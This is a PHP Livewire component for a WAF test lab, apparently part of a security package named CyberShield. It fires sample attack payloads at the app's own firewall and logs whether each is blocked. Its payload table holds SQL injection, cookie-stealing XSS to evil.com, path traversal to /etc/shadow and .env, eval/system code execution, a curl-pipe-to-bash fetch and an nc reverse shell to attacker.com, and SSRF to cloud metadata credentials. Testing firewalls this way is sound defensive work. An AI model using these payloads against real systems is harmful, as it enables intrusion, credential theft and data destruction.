<?php

namespace App\Livewire\Lab;

use Livewire\Component;
use CyberShield\Models\ThreatLog;
use Illuminate\Support\Facades\Cache;
use Symfony\Component\HttpFoundation\Request as SymfonyRequest;

class WafLab extends Component
{
    // Active attack category
    public string $activeAttack = 'sqli';

    // Attack configuration
    public string $sensitivity      = 'high';
    public string $customPayload    = '';
    public bool   $useCustomPayload = false;

    // WAF module toggles
    public array $toggles = [
        'sqli'    => true,
        'xss'     => true,
        'lfi'     => true,
        'rce'     => true,
        'cmd'     => true,
        'proto'   => true,
    ];

    // UI State
    public ?array $result         = null;
    public bool   $isLoading      = false;
    public array  $executionLog   = [];
    public int    $totalBlocked   = 0;
    public int    $totalBypassed  = 0;

    public static array $attacks = [
        'sqli' => [
            'name'    => 'SQL Injection',
            'label'   => 'SQLi',
            'color'   => 'rose',
            'icon'    => 'database',
            'cve'     => 'OWASP A03:2021',
            'desc'    => 'Injects malicious SQL code into queries to bypass authentication or exfiltrate data.',
            'payloads' => [
                'critical' => "' UNION SELECT username, password, 3 FROM users--",
                'high'     => "' OR 1=1; DROP TABLE users--",
                'medium'   => "' OR '1'='1",
                'low'      => "admin'--",
            ],
            'middleware' => 'DetectSqlInjectionMiddleware',
            'helper'     => 'is_sql_injection($input)',
        ],
        'xss' => [
            'name'    => 'Cross-Site Scripting',
            'label'   => 'XSS',
            'color'   => 'amber',
            'icon'    => 'code',
            'cve'     => 'OWASP A03:2021',
            'desc'    => 'Injects client-side scripts into web pages viewed by other users to steal sessions or data.',
            'payloads' => [
                'critical' => "<script src='https://evil.com/steal.js'></script>",
                'high'     => "<img src=x onerror=\"document.location='https://evil.com/?c='+document.cookie\">",
                'medium'   => "<script>alert(document.cookie)</script>",
                'low'      => "javascript:alert(1)",
            ],
            'middleware' => 'DetectXssAttackMiddleware',
            'helper'     => 'is_xss_injection($input)',
        ],
        'lfi' => [
            'name'    => 'Local File Inclusion',
            'label'   => 'LFI',
            'color'   => 'purple',
            'icon'    => 'folder-open',
            'cve'     => 'OWASP A01:2021',
            'desc'    => 'Exploits path traversal to include sensitive server-side files like /etc/passwd or .env.',
            'payloads' => [
                'critical' => "../../../../etc/shadow",
                'high'     => "../../../.env",
                'medium'   => "../../etc/passwd",
                'low'      => "file:///etc/passwd",
            ],
            'middleware' => 'DetectPathTraversalAttackMiddleware',
            'helper'     => 'is_lfi_injection($input)',
        ],
        'rce' => [
            'name'    => 'Remote Code Execution',
            'label'   => 'RCE',
            'color'   => 'cyan',
            'icon'    => 'cpu-chip',
            'cve'     => 'OWASP A03:2021',
            'desc'    => 'Executes arbitrary server-side PHP code, potentially giving attackers full system control.',
            'payloads' => [
                'critical' => "eval(base64_decode('cGhwaW5mbygpOw=='))",
                'high'     => "system('cat /etc/passwd && whoami')",
                'medium'   => "exec('id')",
                'low'      => "phpinfo()",
            ],
            'middleware' => 'FirewallMiddleware',
            'helper'     => 'is_rce_injection($input)',
        ],
        'cmd' => [
            'name'    => 'Command Injection',
            'label'   => 'CMDi',
            'color'   => 'amber',
            'icon'    => 'command-line',
            'cve'     => 'OWASP A03:2021',
            'desc'    => 'Injects OS shell commands into application inputs that are passed to the system shell.',
            'payloads' => [
                'critical' => "; curl https://evil.com/shell.sh | bash",
                'high'     => "| nc -e /bin/bash attacker.com 4444",
                'medium'   => "; cat /etc/passwd",
                'low'      => "&& echo pwned",
            ],
            'middleware' => 'DetectCommandInjectionMiddleware',
            'helper'     => 'is_malicious_payload($input)',
        ],
        'proto' => [
            'name'    => 'Protocol Exploit',
            'label'   => 'PROTO',
            'color'   => 'emerald',
            'icon'    => 'arrow-path-rounded-square',
            'cve'     => 'OWASP A05:2021',
            'desc'    => 'Exploits HTTP protocol-level weaknesses including header injection and SSRF payloads.',
            'payloads' => [
                'critical' => "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                'high'     => "file:///etc/passwd\r\nX-Injected: true",
                'medium'   => "dict://127.0.0.1:11211/stats",
                'low'      => "gopher://127.0.0.1:25/",
            ],
            'middleware' => 'ValidateRequestProtocolMiddleware',
            'helper'     => 'is_malicious_payload($input)',
        ],
    ];

    public function selectAttack(string $type): void
    {
        $this->activeAttack    = $type;
        $this->result          = null;
        $this->useCustomPayload = false;
        $this->customPayload   = '';
    }

    public function toggleProtection(string $key): void
    {
        $this->toggles[$key] = !$this->toggles[$key];
        $this->result = null;
    }

    public function triggerAttack(): void
    {
        $this->isLoading = true;
        $attack  = self::$attacks[$this->activeAttack] ?? self::$attacks['sqli'];
        $payload = $this->useCustomPayload && $this->customPayload
            ? $this->customPayload
            : ($attack['payloads'][$this->sensitivity] ?? $attack['payloads']['high']);

        $this->executionLog = [
            "[" . now()->format('H:i:s.u') . "] Initiating attack simulation: {$attack['name']}",
            "[" . now()->format('H:i:s.u') . "] Payload: " . substr($payload, 0, 60) . (strlen($payload) > 60 ? '...' : ''),
            "[" . now()->format('H:i:s.u') . "] Sensitivity level: {$this->sensitivity}",
            "[" . now()->format('H:i:s.u') . "] WAF module enabled: " . ($this->toggles[$this->activeAttack] ? 'YES' : 'NO'),
            "[" . now()->format('H:i:s.u') . "] Routing through SecurityKernel pipeline...",
        ];

        // If toggle is OFF — simulate bypass
        if (!($this->toggles[$this->activeAttack] ?? true)) {
            $this->executionLog[] = "[" . now()->format('H:i:s.u') . "] RESULT: WAF rule DISABLED → Payload passed through!";
            $this->result = [
                'status'     => 'BYPASSED',
                'type'       => 'danger',
                'headline'   => '⚠ Protection Disabled — Attack Succeeded',
                'message'    => "The {$attack['name']} WAF rule is toggled OFF. The malicious payload \"" . htmlspecialchars(substr($payload, 0, 80)) . "\" was NOT inspected and reached your application code.",
                'payload'    => $payload,
                'middleware' => $attack['middleware'],
                'helper'     => $attack['helper'],
                'lesson'     => "Enable `{$attack['middleware']}` in your route middleware stack or use the helper `{$attack['helper']}` to validate inputs before processing.",
            ];
            $this->totalBypassed++;
            $this->isLoading = false;
            return;
        }

        $this->executionLog[] = "[" . now()->format('H:i:s.u') . "] Forwarding to WAF inspection engine...";

        try {
            config(['cybershield.waf.enabled' => true]);
            config(['cybershield.threat_detection.block_on_threat' => true]);

            // Create a sub-request to probe the WAF
            $subRequest = SymfonyRequest::create(
                url('/lab/probe'), 'GET',
                [$this->activeAttack => $payload, 'search' => $payload, 'q' => $payload],
                [], [],
                ['HTTP_X_CYBERSHIELD_LAB_PROBE' => 'true']
            );

            $response   = app()->handle($subRequest);
            $statusCode = $response->getStatusCode();

            $this->executionLog[] = "[" . now()->format('H:i:s.u') . "] Probe response: HTTP {$statusCode}";

            if ($statusCode === 403) {
                $this->executionLog[] = "[" . now()->format('H:i:s.u') . "] RESULT: BLOCKED by WAF ✓";
                $this->result = [
                    'status'     => 'BLOCKED',
                    'type'       => 'blocked',
                    'headline'   => '✓ Attack Blocked by CyberShield WAF',
                    'message'    => "The {$attack['name']} payload matched a known threat signature in the WAF engine. The request was rejected with HTTP 403 before reaching your application logic.",
                    'payload'    => $payload,
                    'middleware' => $attack['middleware'],
                    'helper'     => $attack['helper'],
                    'lesson'     => "The `{$attack['middleware']}` middleware intercepted this request. In production, decorate your routes: `Route::middleware(['{$attack['middleware']}'])`.",
                ];
                $this->totalBlocked++;
                ThreatLog::create([
                    'ip'          => request()->ip(),
                    'threat_type' => strtoupper($this->activeAttack) . '_' . strtoupper($attack['label']),
                    'severity'    => $this->sensitivity === 'critical' ? 'critical' : ($this->sensitivity === 'high' ? 'high' : 'medium'),
                    'details'     => [
                        'module'         => 'WAF',
                        'payload'        => substr($payload, 0, 255),
                        'user_agent'     => request()->userAgent(),
                        'request_method' => 'GET',
                        'request_uri'    => '/lab/waf',
                    ],
                ]);
            } else {
                $this->executionLog[] = "[" . now()->format('H:i:s.u') . "] RESULT: Request passed through (no WAF match)";
                $this->result = [
                    'status'     => 'ALLOWED',
                    'type'       => 'warning',
                    'headline'   => '⚠ Payload Passed — Check WAF Configuration',
                    'message'    => "The request was not blocked. This is expected in low-sensitivity mode or if the WAF signature files are not fully loaded. The payload reached the application.",
                    'payload'    => $payload,
                    'middleware' => $attack['middleware'],
                    'helper'     => $attack['helper'],
                    'lesson'     => "Verify `config/cybershield.php` has WAF enabled and signatures are loaded. Run `php artisan cybershield:scan` to validate configuration.",
                ];
                $this->totalBypassed++;
            }
        } catch (\Throwable $e) {
            $errMsg = $e->getMessage();
            // If the exception itself is from SecurityException (403 from WAF), treat as blocked
            if (str_contains($errMsg, '403') || str_contains(get_class($e), 'SecurityException')) {
                $this->executionLog[] = "[" . now()->format('H:i:s.u') . "] RESULT: BLOCKED via SecurityException ✓";
                $this->result = [
                    'status'     => 'BLOCKED',
                    'type'       => 'blocked',
                    'headline'   => '✓ Attack Blocked — WAF SecurityException Thrown',
                    'message'    => "CyberShield's WAF engine threw a `SecurityException` which aborted the request. The {$attack['name']} signature was matched. This is the correct, expected behavior.",
                    'payload'    => $payload,
                    'middleware' => $attack['middleware'],
                    'helper'     => $attack['helper'],
                    'lesson'     => "SecurityException is thrown by `WAFEngine::inspect()`. It is caught by the global exception handler and returns HTTP 403.",
                ];
                $this->totalBlocked++;
            } else {
                $this->executionLog[] = "[" . now()->format('H:i:s.u') . "] ERROR: {$errMsg}";
                $this->result = [
                    'status'     => 'ERROR',
                    'type'       => 'warning',
                    'headline'   => 'Simulation Error',
                    'message'    => "Could not complete the simulation: {$errMsg}",
                    'payload'    => $payload,
                    'middleware' => $attack['middleware'],
                    'helper'     => $attack['helper'],
                    'lesson'     => "This may be a configuration issue. Ensure the package provider is registered and `php artisan vendor:publish --tag=cybershield-config` has been run.",
                ];
            }
        }

        $this->isLoading = false;
    }

    public function resetLab(): void
    {
        $this->result       = null;
        $this->executionLog = [];
        $this->customPayload = '';
    }

    public function render()
    {
        return view('livewire.lab.waf-lab')
            ->layout('layouts.app')
            ->title('WAF Firewall Lab');
    }
}
